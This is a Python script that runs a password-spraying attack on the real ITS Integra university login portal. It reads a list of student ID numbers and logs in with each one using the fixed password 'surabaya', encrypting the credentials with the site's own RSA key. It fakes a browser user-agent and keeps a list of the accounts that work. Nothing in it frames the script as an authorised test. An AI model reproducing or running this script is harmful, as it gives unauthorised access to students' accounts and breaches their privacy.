from fire import Fire
from tqdm import tqdm
import base64
import json
import re
import requests
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from bs4 import BeautifulSoup
from multiprocessing import Pool

session = requests.Session()
session.headers.update({
    'User-agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'
})

INTERNET_HOME = 'https://id.its.ac.id/I/index.php'
INTERNET_LOGIN = 'https://integra.its.ac.id/index.php?n=internet&p='
LOGIN_POST = 'https://integra.its.ac.id/index.php'
INTEGRA_BASE = 'https://integra.its.ac.id/'

URL_PATTERN = re.compile(r"URL=([^'>]+)")


def process_login(nrp,login_url: str=INTERNET_LOGIN) -> bool:
    global session
    response = session.get(INTERNET_LOGIN)
    if response.status_code != 200:
        print('[GET LOGIN URL] Response', response.status_code)
        return False

    soup = BeautifulSoup(response.content, 'html.parser')
    pubkey = soup.find('input', {'id': 'pubkey'})
    if pubkey is None:
        print('[LOGIN FORM NOT FOUND]')
        return False

    pubkey = pubkey['value']
    rsa_pub_key = RSA.importKey(pubkey)
    cipher = PKCS1_v1_5.new(rsa_pub_key)

    plain_text = nrp+ "|||" + "surabaya"
    encrypted = cipher.encrypt(plain_text.encode())
    encrypted = base64.encodebytes(encrypted).decode().strip()
    form_data = {'content': encrypted, 'p': '', 'n': ''}
    response = session.post(LOGIN_POST, data=form_data)

    if len(URL_PATTERN.findall(response.text)) >0:
        pass
    else:
        return False
    url_redirect = INTEGRA_BASE + URL_PATTERN.findall(response.text)[0]
    response = session.get(url_redirect)
    if response.status_code != 200:
        print('[LOGIN REDIRECT] Response', response.status_code)
        return False

    soup = BeautifulSoup(response.content, 'html.parser')
    if 'Logout' in soup.text:
        print('login berhasil')
        return True
    return False

def loginer(nrp):
    global session
    hasil = process_login(nrp)
    session.cookies.clear()
    return hasil

def main(nrp_txt_path):

    koleksi_nrp = open(nrp_txt_path).read().splitlines()
    i = 0
    hore = []
    jumlah_berhasil = 0

    for nrp in tqdm(koleksi_nrp):
        if loginer(nrp):
            hore.append(nrp)


if __name__ == '__main__':
    Fire(main)